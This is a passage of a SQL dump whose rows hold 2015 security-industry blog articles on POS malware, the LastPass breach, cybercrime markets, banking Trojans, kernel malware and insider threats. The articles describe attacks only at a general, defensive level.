Team (US-CERT)\'', 'https://securityintelligence.com/navigating-a-sea-of-threat-intelligence-specifications/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (401, 'The POS Malware Epidemic: The Most Dangerous Vulnerabilities and Malware', 'Limor Kessem', '2015-6-19', 'Point-of-sale (POS) malware is an information security ailment that, within less than seven years, reached colossal proportions and became more damaging to organizations than almost any other threat. Although this threat is less sophisticated than malware like banking Trojans, it can be hugely destructive due to the following:\n I would have collected some information about how much these card breaches cost the victim organizations, but after we all witnessed the Target breach — its detrimental financial results in both hard and soft costs, its damage to the brand and its executive team and the never-ending legal mess it is   — I think we all get the point.\n What Target was a victim of, as well as many other retailers and card processors that suffered a POS malware attack experienced, is the work of cybercriminals and organized cyber gangs who went after card data from customer transactions. The end goal is to rob the data and then use the card information in fraudulent purchases.\n POS malware is actually a generic name for a growing number of Trojan families that are designed to scrape point-of-sale terminals’ RAM memory. It is designed to look for, grab and exfiltrate credit and debit card data from the endpoints that process and store it.\n The notion of stealing payment card and PIN data is not new. Criminals always found card data to be highly lucrative and still use a number of real-world crimes to skim data in ATMs and card readers. They also try to compromise POS equipment installed at brick-and-mortar retailers to have the data stolen and streamed to them. Some criminals attempted sniffing data sent over Wi-Fi to back-of-the-house servers, but at the end of the day, all those physical crime scenarios demand deeper knowledge to tamper with the equipment and typically involve an insider.\n You can easily infer that using POS malware is lucrative because it is considered a much safer and simpler way for cybercriminals to get their hands on large numbers of live payment cards without ever showing their face on security cameras.\n Interestingly enough, POS Trojans all essentially work in the same way. They are called RAM scrapers because they aim to scan certain parts of POS terminal memory, find card data in there and send it to their botmaster.\n Once a card transaction goes through on the POS terminal side, the card’s data is almost instantly stored on the endpoints the retailer has in place. In most cases the data is encrypted, which is also a compliance requirement for merchants. But while encryption is supposed to fully protect the data, there is a split second in which it is still unencrypted as it waits for authorization to complete, saved in process memory.\n That split second is the tiny window of opportunity POS Trojans use to attack. They scan the RAM looking for card data and then scrape it from there, hence the name “RAM scrapers.”\n On the technical level, POS RAM scrapers retrieve a list of running processes on the endpoint that handles the data, they load inspect each process’s memory and then they look for card data to grab from it. How did they figure out that they should attack on the RAM level? Well, most application vendors do not encrypt data in memory and for years have considered RAM to be safe. But today, RAM scrapers are generally injected into running processes and can intercept sensitive data from memory in an instant.\n The malware scrapes the track-one and track-two card data encoded into the magnetic stripe. This data is valuable because it includes the card holder’s name, primary card number and security code, as well as other information about charge types permitted and some user details. Once they have the data, the Trojan is configured to send it out on a predetermined time, intending to appear as inconspicuous as possible, or it can be exfiltrated by the criminals on demand. Past attacks have shown that the cybercriminals favor sending the data to an intermediate location first and then collect it from there. This process is most likely part of their way to conceal themselves from a potential law enforcement investigation. This method was used in the  , but it is also used by more recent POS malware operations, in some cases even sending the data to a number of places at the same time.\n Sitting stealthily on POS terminals or the servers that store the transaction data, these Trojans can amass large numbers of cards and transmit them onward to the attackers and, unless detected, cause more damage with every passing hour.\n \n Unfortunately, getting malware on POS terminals has only been getting easier and easier with time. Is this illogical? Sure. But the reality of things is that, in the past, POS terminals were proprietary equipment issued by different vendors. They were different from one another and not typically open to any type of activity aside from processing payments. It used to be rather tricky to tamper with POS terminals unless one had physical access to the device.\n Nowadays, POS terminals are simple computers, with either Windows or UNIX operating systems, which are comparable to using Windows XP. These systems are considered easy to exploit from a technical point of view, especially with the level of resources and sophistication cybercriminals have today. Exploitation possibilities only expand when employees have to use the terminal to receive email from chain store centrals, for example, or when they use the terminal for general Internet browsing, both of which greatly increase the chance of malware infection.\n Factors that add more trouble to the mix are updates that need to be pushed to many terminals at once, which therefore require regular remote access to all of them; attackers prey on that event. Also, some merchants hire tech support from their POS vendor or from a third party, which leads to their installing remote control tools on the terminals for troubleshooting — another place for the criminal to try to sneak in. This entry point becomes even easier to manipulate when the merchant keeps the default password for remote access.\n So getting into terminals is not all that difficult. Getting into data servers is a bit harder but clearly possible.\n Cyberattacks on point-of-sale terminals date back as far as 2005, when crime gangs began using ARP spoofing attacks to have transient payment card data sent to them. At the time, a group of attackers led by Albert Gonzalez managed to rob the data of over 170 million payment cards within two years.\n RAM scraping started a few years later. The earliest official evidence of the scraping malware was described in a 2008  . The technical principle used back in 2008 is what enables POS malware to scrape card data to this very day:\n While it was only available to the cybercrime elite at the time — most likely organized cybercrime lords who had the money to invest into developing this sort of project — RAM scraping became a gold mine for black-hat criminals who understood how to use it against retailers, financial service providers, food and beverage companies and the hospitality industry, to name a few.\n It only took commercial cybercrime a couple of years to break through with POS malware for sale. Vendors in the Russian underground began selling Trojans like RDAsrv and mmon.exe (Kartoxa) in 2010 and 2011. By 2012, the source code of malware called BlackPOS was leaked, opening up the underground market to new creations that reused its code in many variations of the same beast. This is also when the most infamous bunch emerged and changed the crime scene forever: Dexter, Alina and vSkimmer became available to criminals on the global level, peddled in Russian-, English-, German- and Spanish-speaking venues.\n The ensuing evolution was rapid, but nothing prepared retailers for the 2014 POS malware onslaught that resulted in highly publicized card breaches damaging brands like Target, Home Depot, P.F. Chang’s and many more. That year was the beginning of a new era for RAM-scraping Trojans, which marked the first time POS malware came with actual botnet capabilities, communicating with a central command-and-control (C&C) server, deploying a keylogger on the infected systems and using creative exfiltration schemes to send data to the attackers.\n 2014 can be called a quantum leap in both the technical makeup and popularity of POS malware, which left victim retailers picking up the pieces in the aftermath of attacks attributed to names such as BackOff, ChewBacca, Debacal, JackPOS, Soraya, BrutPOS, Poslogr, NewPosThings, FrameworkPOS and one of many new versions that sprung from the leaked BlackPOS source code.\n We only had to deal with five POS malware families up until 2013, faced eight new families in 2014 and then, six months into 2015, we already have seven new families to reckon with — and we still have two quarters to go. It seems that while the inner workings of POS malware are pretty clear at this point, stopping them before damage occurs proves to be the more challenging task.\n 2015 thus far has brought us names such as PoSeidon, FindPOS, FighterPOS, PunKey, NitlovePOS and MalumPOS, all of which were discovered within a matter of weeks. These Trojans were unearthed by security researchers who investigate actual attack incidents. In many of these emerging families, researchers note that new capabilities were built into the code. For example, a distributed denial-of-service (DDoS) module was added to FighterPOS. PoSeidon now runs a routine to steal remote control credentials from endpoints using LogMeIn. NewPosThings dumps virtual network computing (VNC) passwords, also used for remote control. Operations-wise, Punkey compromised data that was encrypted and sent to numerous C&C servers simultaneously to complicate investigation into where the data went. Moreover, Punkey is configurable malware, meaning it can be used to compromise a variety of POS system types. The most recent predator is MalumPOS: It attacks POS systems running on Oracle MICROS, a platform popularly used in the hospitality, food and beverage and retail industries.\n Actors that engage in this type of card data theft come from a number of crime grades. Overall, there are cybercriminals who facilitate the technical side, which includes the hacking, grabbing and exfiltration of data; on the other hand, there are criminals who facilitate the sale of the data or the actual use of card information in fraudulent card-not-present (CNP) scenarios.\n Many times data repositories are sold in bulk to underground shops, which in turn resell them to fraudsters by the unit.\n Since it became available for sale in the cybercrime black market, obtaining and using POS malware is simpler than ever. Even novice criminals can buy the malware and pay for technical help in underground venues. In a recent case, one man working alone was able to steal data on over 22,000 payment cards with a RAM scraper-subbed  . The man targeted over 100 entities in Brazil using the malware.\n POS malware becoming more accessible has resulted in attacks reaching epidemic proportions. With POS malware kits widely available, black-hat attackers don’t have to develop their own code from scratch, but rather ride on existing Trojans that they can enhance. Take, for example, the infamous BlackPOS. After this Trojan’s source code was leaked, the reused code was detected in other malware that accounted for some of the most high-profile attacks. BlackPOS itself has been available in the underground since February 2013, only costing about $2,000 for a basic license. Compared to the price tags of tens of thousands of dollars that used to be charged for banking Trojans, this is a very modest cost for criminals who can then net millions in fraud money.\n So what is being done to stop POS malware, and what are some ways to become more resilient in the face of this threat? Let’s focus on the core issues:\n Great! So why doesn’t everyone just do that and shut POS malware down for good? Actually, that’s where things are going right now.\n On the compliance side,   is the current enforcement of a new payment card security standard, which calls for immediately ending the use of the outdated Secure Sockets Layer (SSL) encryption protocol that can put payment data at risk. The council demands stronger encryption be used, although many still believe it is not sufficient and should require full-disk encryption on terminals that process card payments.\n The White House’s   was put into place in late 2014 to accelerate the transition to stronger security technologies and the development of next-generation payment security tools. The ongoing transition to EMP cards is underway, with a purpose of deterring criminals from cloning data onto counterfeit cards. Once fully in place, these measures intend to drastically reduce the number and scope of POS malware attacks.\n With all of the above, let’s keep in mind that information security is always a function of the organization’s size and the security budget it can put in place to buy technology and educate users about potential threats. Larger organizations are more likely to deploy an effective security and incident response plan. While they are the most lucrative targets for cybercriminals, it is the small and midsize businesses that stand to close down if a breach affects them. SMBs are considered more exposed because they have fewer resources to invest into security and because criminals know this and come after them. For the criminals, it does not really matter if they steal lots of cards from one big place or smaller amounts of cards from many places.\n Here are some protective measures that any organization can and must put into place to strengthen its security posture:', '\'Banking Trojan\', \'BlackPOS\', \'Malware\', \'Point-of-Sale (POS) Systems\', \'POS Malware\', \'PoSeidon\', \'Trojan\'', 'https://securityintelligence.com/the-pos-malware-epidemic-the-most-dangerous-vulnerabilities-and-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (402, 'Password Manager Breached — Is There a Safe Alternative?', 'Dana Tamir', '2015-6-17', 'Password manager LastPass   a data breach incident yesterday where suspicious activity was identified on its network, and user data has been compromised. LastPass stated that the hackers stole data that included master passwords and other login details, potentially exposing data that has been stored with passwords. More specifically, the announcement refers to “user email addresses, password reminders, server per user salts and authentication hashes.” It’s not the first time, and certainly not the last time, that cyberattacks have targeted password managers. Last year we wrote about a different type of attack that   using a variant of the Citadel Trojan, which targets end-user systems. Since those password managers are installed locally, some have suggested that cloud-based password managers and single sign-on (SSO) solutions might provide an alternative. However, this breach shows that attackers will try to compromise any password manager solution regardless of its architecture, and with a cloud-based password manager, the attackers gain an asymmetric advantage: Instead of one machine yielding credentials for one user, they only have to target a single site to compromise the credentials of thousands, if not millions, of users. In these days of  , requiring the use of complex passwords is imperative. Yet for many users, managing different passwords and remembering them is a hassle. In order to minimize the number of passwords to remember, some will reuse the same password. This is a dangerous practice because, if stolen, that single password can provide access to all systems and sites with no separation between personal apps such as Pinterest and corporate systems. Cybercriminals know this, which is why even seemingly innocuous credentials are so valuable to them. There is no shortage of examples of websites that were breached and user credentials stolen:   had 150 million passwords stolen; millions of passwords were stolen from  ; and Yahoo, Adobe and many others join the litany. As a consequence, it is important to require employees to use different passwords for accessing corporate resources and their personal apps. This can easily be achieved with   that can automatically alert on, and optionally prevent, password reuse by employees. As for LastPass users, the company says that it is confident that the encryption measures it uses “are sufficient to protect the vast majority of users.” In any case, we recommend that at minimum users change their master passwords. To be on the safe side, it is probably best to change all the passwords contained by LastPass, as well.', '\'Breach\', \'Data Breach\', \'LastPass\', \'Password\', \'Password Management\', \'Password Protection\', \'Single Sign-On (SSO)\'', 'https://securityintelligence.com/password-manager-breached-is-there-a-safe-alternative/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (403, 'Cybercrime Ecosystem: Everything Is for Sale', 'Etay Maor', '2015-6-15', 'When discussing malware, we tend to focus on the technical aspect of how a specific   operates on an infected system. The processes executed by a malware variant, ranging from how it latches onto an infected device to how it manipulates the user into providing it with credentials, are just a small subset of the cybercrime ecosystem. Roughly eight years ago, a single operator would be in charge of everything from coding the malware to distributing it, including setting up command-and-control (C&C) servers, identifying infection points, working with money mules and more. Today, the whole process, or at least each individual element, can be easily outsourced.  offer professionals and amateurs alike a wide array of tools and services with varying prices and support levels. Some tools, such as malware samples, can be downloaded for free, while other elements of the fraud chain, such as cashing out via a mule account, come at a high cost due to scarce resources in the field. Almost any form of   requires more than just one tool. Whether it is phishing, ransomware or financial crimeware, they need hosting sites, C&C servers and/or a cash-out methodology. Some underground services are now also sold as cloud services, offering easy access and added security. The underground market is showing no signs of slowing down, but rather of adaptation to industry trends. Even services and tools described in the   above can be broken down and sold separately. For example, HTML injections, specific scripts, configuration services and more can all be purchased separately when designing the malware of choice. It is also worth noting that cybercriminals are not only discussing and selling financial fraud tools, but also advanced targeting tools and RATs, health care and insurance fraud tools and services and much more. The current cybercrime ecosystem makes a wealth of options available to cybercriminals. Unfortunately, that drastically increases the scope and complexity of schemes that could target an organization. Thorough prevention and detection systems are needed to avoid these security problems, but they must be   such as fraud protection for a comprehensive defense.', '\'Cybercrime\', \'Financial Fraud\', \'Fraud\', \'Malware\', \'Online Fraud\'', 'https://securityintelligence.com/cybercrime-ecosystem-everything-is-for-sale/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (404, 'Does ‘Mr. Robot’ Reprogram the Hollywood Hacker Mindset?', 'Pamela Cobb', '2015-6-11', 'USA Network’s new show, “ ,” is a fusion of hacktivism, outsourced managed IT security and a somewhat anarchistic effort to rebalance the wealth and power on the planet. As with other recent movies and shows that portray the mysterious world of high-tech hacking, there is often a separation of real-world methodologies and Hollywood glam. So how does “Mr. Robot” stack up, and what can we glean from it? Perhaps the word refreshing is an odd choice, but that is the term that comes to mind. Rather than relying on shot after shot of frantic typing and electric pulses streaming through a circuit board to build suspense, the show brings a more realistic portrayal of hacking and cybersecurity, making the characters the focus and letting the technology support the story. It may seem counterintuitive, but by letting the security practices advance the story rather than be the story, it’s ultimately a more satisfying viewing experience. The main character, Elliot, played by Rami Malek, is a white-hat cybersecurity practitioner by day and black-hat hacker by night. Against the backdrop of some questionable life choices, much of his black-hat work is small in scale and focused on righting wrongs — until he meets the mysterious Mr. Robot. And then things get interesting. One of the things Elliot excels at is  , and the pilot episode shows at least three examples of how it works. Whether it was weak passwords made of combinations of the target’s favorite band and year of birth or terms like “123456Seven,” Elliot is a master of piecing together information from social media profiles to break into accounts. He borrows a cellphone under the guise of calling his mom to grab additional personal information and even makes calls posing as a representative of a fraud department at the target’s bank. In real life, practices like these make it vital for corporate password policies to ban reuse between corporate and personal systems. It’s bad enough that your social media accounts could be compromised, but it also endangers your clients’ personally identifiable information (PII) all because you or your employees had difficulty managing  . Going beyond password reuse, user education to combat social engineering is a bit harder since of the fundamental human nature to be helpful. Well-intentioned employees can become inadvertent insiders with a few simple clicks in an email or by trying to answer questions from a “confused” caller. Rigorous corporate training can help, but it is a constant struggle. Distributed denial-of-service (DDoS) attacks have been in the   for breaches in the past four years. Popular media would have you believe that DDoS is used only to slow network traffic and disrupt business, so it was a pleasant surprise in “Mr. Robot” to see DDoS used as a cover-up for network infiltration and for the cybersecurity team to come to that conclusion relatively quickly. The show also truly embraced the distributed aspect of the event by referencing attacks coming from multiple countries, not just implying one attacker sitting in his basement, typing and practicing his evil laugh. While there are a number of security solutions and practices you can employ to protect your network, recovering and mitigating DDoS requires the right mix of processes, people and technology to defend your infrastructure from both volume-based and application-based DDoS attacks. Without revealing too many spoilers, at the start of the show, we see Elliot confront the owner of a local coffee shop about his illicit private Web server running in the Tor network. Tor is an anonymizing service that serves as a gateway to the  , a semiprivate Internet where illegal marketplaces and underground forums reside. In the show, Elliot monitors Tor exit nodes, or the servers where encrypted, anonymized traffic resurfaces to the public Internet. By doing so, he was able to intercept unencrypted traffic used to incriminate the shady shop owner. We hear a lot about encryption, with respect to both the privacy benefits and the risk that it can obfuscate terrorist and criminal activity. There is also some misconception in movies and TV about magic of encryption. Sometimes encryption is seen as a silver bullet, impervious to detection or discovery, and sometimes it is seen as some elite marker where only a true cybercriminal can break through. In reality, it is a little of both. As designer vulns like FREAK and LogJammer have shown, not all encryption was created equally. Older encryption methods can be easily cracked and are no longer secure. As also illustrated in “Mr. Robot,” even using modern updated encryption like that used by the Tor network still has weak points where data can pass unencrypted and be vulnerable to eavesdropping or attack. Mr. Robot doesn’t treat the audience like they are idiots; the word “firewall” is never once uttered in the entire pilot episode. The show expects viewers to keep up with lingo like rootkits, IRL and Tor exit nodes, not to mention recognize the absurdity of executives running Linux. While that’s refreshing for those of us in the business of cybersecurity, it may turn off less savvy viewers. On the other hand, a cyber Robin Hood with a dusting of Chuck Palahniuk’s “Fight Club” and the ennui of   is a refreshing addition to this summer’s programming.', '\'Encryption\', \'Entertainment Industry\', \'Hacktivism\', \'Social Engineering\', \'Tor\'', 'https://securityintelligence.com/does-mr-robot-reprogram-the-hollywood-hacker-mindset/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (405, 'Got Linux? BillGates Botnet Activity on the Rise', 'Michelle Alvarez', '2015-6-11', '–  You may be right there, Mr. Gates, but the   has definitely had a longer shelf life than that of a piece of fruit. It was first disclosed on a Russian IT website in February 2014 as a targeter of (ironically) Linux systems. Despite the legendary name attached, the BillGates botnet certainly hasn’t gained the same notoriety as other botnets such as Zeus or Conficker. Some press surfaced when it was first disclosed, but most just chalked it up as one more botnet in a global sea of malware. However, in February of this year, IBM Managed Security Services observed a sharp increase in security events associated with this botnet over the span of three days. The traffic subsequently subsided and remained steady until early May. Since May 6, however, the team has observed a noteworthy increase in traffic that has remained elevated. Much of this recent traffic is representative of the BillGates botnet attempting to perform DNS   attacks with packet forgery. The threat actors behind the BillGates botnet are not known. However, the destination IP associated with the majority of the traffic observed in May 2015 is  . This IP’s country of origin is China, which has been found to be associated with the BillGates botnet. Similarly, the majority of the traffic observed in February was also linked with another IP in China,  .   One of the important steps to prevent any botnet from taking a foothold on your network is to protect your organization’s systems from bot infection in the first place. Endpoint antivirus solutions should never be relied upon as the only protective mechanism for threats, but they are the most common initial detection tool. It is recommended that organizations ensure their antivirus solutions are updated with the latest virus definitions to maximize their effectiveness. Enterprises should also consider using different antivirus products for different purposes. For instance, use one antivirus product for the desktops, another one for servers and another for the email gateway. Attackers also take advantage of users running outdated software with known   that could provide a window of opportunity for   to sneak by. Perform regularly scheduled software updates with the latest security patches on PCs as well as mobile devices. If malware penetrates your defenses, then notification of an infection is key to preventing your network from being overrun by a botnet. As with all malware and computer incidents in general, having good visibility across the network is crucial to identifying problems and responding quickly. Intrusion defense systems and intrusion prevention systems are useful tools for determining when and how an incident has occurred. Finally, isolate and clean any computers that have been identified as infected. Disconnect them from the network to prevent infection to other computers.', '\'Botnets\', \'Distributed Denial-of-Service (DDoS) Attacks\', \'IBM Managed Security Services (MSS)\', \'Malware\', \'Managed Security Services Provider (MSSP)\'', 'https://securityintelligence.com/got-linux-billgates-botnet-activity-on-the-rise/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (406, 'Zero-Day Vulnerabilities Matter, but Don’t Ignore Known Issues', 'Domenico Raguseo', '2015-6-10', 'Discussing zero-day attacks is interesting for all security experts, from CISOs to journalists, whether the talks occur at conferences or within enterprises. The reason for this is quite obvious: The exploitation of unknown vulnerabilities, which are also referred to as zero-day vulnerabilities, is quite aggressive and could create serious problems for an organization. In fact, the victim is absolutely exposed, unaware of any action that could be taken to mitigate the risk.\n Knowing how to react to such vulnerabilities when they arise is important. Naturally, that means there is a   associated with preventing, detecting and responding to zero-day vulnerabilities. Similarly, malware with the capabilities to exploit such weaknesses has a cost, as well, and many malicious attackers are willing to pay if they think the end results will be profitable.\n The risks associated with zero-day vulnerabilities are well-established, and there are technologies developed to limit such risks. But a more interesting topic of discussion may center around how organizations decide whether they are a likely target of a zero-day attack. If I’m exposed to risks due to a zero-day vulnerability, for example, I hope no one will know about it, and it’s unlikely they would. That is, unless someone is willing to pay money to exploit the weakness and carry out an attack. But organizations must first decide whether they are important enough — or have data that is important enough — for someone to spend the money to launch an attack. Depending on the answer, they may be better served focusing their resources on other   issues.\n We shouldn’t underestimate the severity of the  , but what about the more well-known vulnerabilities? These could be just as dangerous to an organization, even if a security team is prepared for them. If a vulnerability is well-known, the attacker could simply perform some research to see who is affected and what can be done to exploit the weakness. This is facilitated by the fact that most of the Internet uses the same foundations — operating systems, application servers, protocols, etc. — so it’s relatively easy to carry out these malicious instructions.\n If the vulnerability is well-known, very likely providers have made patches available. This could be useful if the patch is installed, but adding fixes to a program is not always immediate. And even in situations when the fix is completed in a timely manner, enterprises may still be at risk. Patches represent a sort of map for the attacker. The patch is a small portion of code that can be used to understand how to exploit the vulnerability, specifically in places where it has not been installed. It’s no surprise that if the attention of the cybersecurity world is on  , malicious actors can still infiltrate organizations. Many of the publicized attacks involve very well-known vulnerabilities.\n Organizations and security professionals will always have to pay attention to zero-day vulnerabilities, but do not forget a proper   integrated within your security intelligence platform. This will reduce your risk of attack dramatically — and reduce the costs.', '\'Security Intelligence\', \'Threat Management\', \'Vulnerabilities\', \'Vulnerability Management\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/zero-day-vulnerabilities-matter-but-dont-ignore-known-issues/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (407, 'Tinba: World’s Smallest Malware Has Big Bag of Nasty Tricks', 'Ori Bach', '2015-6-9', 'IBM Security Trusteer researchers have recently discovered an infection campaign using a new variant of the banking Trojan Tinba that targets European banking customers. The latest version has been enhanced with several capabilities that significantly improve the malware’s effectiveness and resiliency. Tinba is a truncation of “tiny banker” and, when first discovered in 2012, was the smallest banking Trojan in circulation by file size. Tinba’s destiny took an interesting turn when its source code was publicly leaked in July 2011 in an apparent dispute between rival cybercriminals. Since the leak, various gangs have been able to rework the ready-made malicious code at no cost.  in September of last year that, as a result of the proliferation of the source code, several campaigns using Tinba variations were launched in countries around the world, in many cases sporting significant improvements to the original code. In May 2015, IBM Security Trusteer researchers discovered a Tinba infection campaign targeting Poland, Italy, the Netherlands and Germany. Nearly half of the recognized incidents were focused on Poland, with 45 percent of the security events able to be traced back to the country. Italy was a distant second at 21 percent, according to the research. When Tinba infects a computer and the user tries to log in to one of the targeted banks, Tinba’s webinjects are launched into action. Depending on the targeted bank, victims are presented with fake messages and Web forms asking for personal information, login credentials or requests to perform a funds transfer. The notice may even attempt to convince users that money has been added to their account accidentally and must be refunded immediately. In line with Trojan anti-research and resilience features, the author of this Tinba variation, wary of potential hijacking and takedowns, incorporated several fallback mechanisms to make sure the botnet remains intact. These safeguards include: This latest Tinba campaign is just one of many malware threats that have migrated to Europe after previously targeting U.S. banks. Cybercriminals such as the   gang have been able to overcome language barriers and adapt their tactics to attack local banks. While this trend may prove a challenge to many banks who have not yet hardened their defenses, it also provides an opportunity for those institutions to take advantage of the lessons learned having   elsewhere.', '\'Banking\', \'Banking Trojan\', \'IBM Security Trusteer\', \'Malware\', \'Tinba\', \'Trojan\', \'Trusteer\'', 'https://securityintelligence.com/tinba-worlds-smallest-malware-has-big-bag-of-nasty-tricks/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (408, 'Detecting and Analyzing Kernel-Based Malware', 'Engin Kirda', '2015-6-4', 'Increasingly, malware authors are crafting attacks to inject malicious code into operating system (OS)  , where it is essentially invisible to many security systems. Instead of exclusively relying on user-mode components, we now see advanced attacks targeting the kernel. While it may not be surprising that most signature-based detection technologies miss kernel-based malware, many behavior-based malware tracking tools, such as some sandboxes, can’t detect kernel-based malware using traditional hooking mechanisms. Once in the kernel, very few security technologies have visibility into kernel-mode malware behavior. Additionally, these components have equal or even higher privileges than most  . Thus, attackers can essentially take safe refuge in the kernel, acting on nefarious intentions with little concern for getting caught. As my Lastline Labs colleague   a few months ago, and as I briefly discussed in my recent  , attacks against Windows users with components executing in the kernel of the OS are particularly pernicious because their kernel components run with the highest level of permissions available on the system. This often puts traditional AV systems at a lower permission level than the malware itself. As a result, malware in the kernel can operate undetected, executing system calls and connecting to command-and-control (C&C) servers with full authorization as a privileged application.\n In addition to enjoying supreme permissions, kernel-based malware is impervious to traditional hooking mechanisms used by first-generation sandboxes during analysis of unknown or suspicious code. Most sandboxes intercept API function invocations using hooks into user-mode libraries loaded by a program undergoing dynamic analysis. Traditional sandboxes intercept and in some cases tamper with parameters passed to functions that are used to perform malicious behavior. Somewhat more advanced sandboxes also block a program’s system calls in an attempt to analyze evasive malware that bypasses user-mode functions and targets the OS kernel directly. This interception of code to detect and analyze suspicious behaviors fails to extract or record malicious functions when they are loaded into the kernel. Once there, the malicious components are indistinguishable from trusted OS code since the malware behaviors no longer rely on user-mode APIs or system calls.\n When attempting to detect kernel malware, it is important not to limit hooking mechanisms to API or system calls, which I’ve argued in some of my   as far back as a decade ago. In fact, kernel-bound malware is based on the context of untrusted operations (e.g., new drivers), and determining whether code belongs to the original kernel or is in user space requires further analysis.\n The research community has taken notice of kernel-based malware such as Equation, Regin, Dark Hotel and Turla/Uroburos. But not all kernel-based malware is created equal. For example, in many cases, kernel hardening has made it necessary for attackers to reboot the target system in order to turn off default protections that prevent injection of code into the kernel. Rebooting can draw unwanted attention and may raise suspicions enough to thwart an attack. However, new, more advanced kernel-mode malware like Turla does not require a reboot to circumvent standard kernel protections.\n Taking a   gives us insights into a new breed of more sophisticated kernel-based malware.\n Turla is able to bypass signature verification for drivers and defeat PatchGuard to infiltrate Windows OS kernels. This one-two punch means new kernel hardening approaches implemented by Microsoft in modern versions of the Windows OS are insufficient to prevent injection of Turla malware into the kernel. First, Turla gets past driver signature verification by loading a vulnerable version of a signed VirtualBox driver. This lets a user-mode application write to arbitrary memory locations in the kernel. Second, Turla essentially intercepts PatchGuard alerts to prevent the triggering of the infamous “blue screen of death.” And like other kernel-based malware, Turla can defeat traditional sandboxes by bypassing hooking mechanisms that operate in the kernel.\n Kernel-based attacks typically use kernel rootkits to hide the user-mode components of malware and avoid detection. An attacker first exploits a user system by loading malware into the kernel, which then intercepts user-mode application system calls, filtering any data returned by the program that might trigger  . As an example, security tools might monitor for new files generated in a directory so the kernel-based malware removes malicious files before returning a directory listing. This kernel rootkit can also filter and conceal registry modifications, running processes or other events generated by the attacker. In this way, kernel-based malware can be used to cover tracks and conceal threats both within the kernel and in user-mode components alike. However, knowing this is the case, if filtering code is loaded into the kernel, one can be alerted to the very high likelihood of malicious intent.\n By analyzing any new code loaded into the OS kernel using full-system emulation, one can catch the kernel-based attack in the act. Whenever a critical function or memory location is hooked or modified, the analysis can assume that an attack is potentially underway. Taking a closer look, security analysts would then be able to gain insight into the behaviors of previously invisible kernel-based attackers before they quietly execute and cover up nefarious schemes from a privileged position.', '\'Advanced Malware\', \'Advanced Threats\', \'Kernel-Based Malware\', \'Malware\', \'Operating System (OS)\', \'Rootkit\', \'Security Research\', \'Threat Detection\', \'Threat Intelligence\', \'Windows\'', 'https://securityintelligence.com/detecting-and-analyzing-kernel-based-malware/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (409, 'The Threat Is Coming From Inside the Network: Insider Threats Outrank External Attacks', 'Nick Bradley', '2015-6-1', 'There are plenty of reasons to assume that most cyberattacks are the work of far-off bad guys with a political ax to grind or searching for fame and fortune. After all, we hear about them in news reports just about every day, leaving businesses and consumers wondering whether their data can ever be considered safe again. What’s not discussed, however, is that 55 percent of all attacks are carried out by malicious insiders or inadvertent actors, also known as insider threats. In other words, they were instigated by people you’d be likely to trust. IBM Security is releasing two reports to educate the public on these threats: the “ ” and the “ .” \n In the Cyber Security Intelligence Index, IBM Security Services reveals insights based on the continuous monitoring of billions of events per year. In 2014, organizations monitored by IBM Security Services experienced approximately 81 million security events, amounting to over 12,000 attacks and 109 incidents for each client. The Index proves statistically that every company is being compromised. “Unauthorized Access” led all security incidents in 2014. For the two previous years, malicious code and sustained probes or scans dominated the security incident landscape. However,   were game changers in 2014, which allowed Unauthorized Access incidents to rise to the top and account for 37 percent of all events in 2014, up 19 percent from 2013. The rise of social media, cloud, mobility and big data is making insider threats harder to identify while also providing more ways to pass protected information. If we break out the malicious insiders from the inadvertent actors, we see several profiles: disgruntled employees who exit the company but still have access to old privileges or create back doors before leaving; malicious insiders taking advantage of lax deprovisioning of expired or orphan accounts to attack valuable resources or with privileged access who sell information for financial gain; and the inadvertent insiders who do not mean harm but fall prey to social engineering schemes that grant access to outside attackers. There are even “quasi-insiders” who could be considered trusted third-party contract workers. In the IBM X-Force Threat Intelligence Quarterly, we investigate how social engineering has turned an annoyance like spam into a legitimate attack vector, with for-profit operators creating and selling spam campaigns to trick inadvertent insiders to open an attachment or click on a link. Although the current volume of spam is comparable to that of 2013, the percentage of spam carrying malware jumped from 1 percent in early 2013 to around 4 percent in 2015, making this a high-growth channel for  . \n As the Index expressed, every organization is under attack. The 81 million security events experienced by IBM MSS clients — a subset of the billions of events IBM Security monitors daily — were filtered down with continual policy tuning by 11 percent to reduce the noise, allowing analysts to focus on true threats. But despite the resulting reduction of noise, the average number of serious incidents held fast to 2013 levels at 2.1 a week. \n Through rigorous practices, enterprises can better manage and scrutinize users and networks for both  . Network forensics can help companies better understand activity coming into and going out of the network, and the ability to reconstruct the activities that took place during a network compromise is essential to securing data and preventing further harm. Furthermore, monitoring privileged access is essential to managing the risk associated with user entitlements to sensitive data. I encourage you to download and take advantage of the information in both the Index and the Threat Intelligence Quarterly. We’ll have additional information here on Security Intelligence in the coming weeks to continue the discussion. You can also watch our on-demand webinar, “ .”', '\'IBM Managed Security Services (MSS)\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Insider Threat\', \'Malware\', \'User Education\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/the-threat-is-coming-from-inside-the-network/');
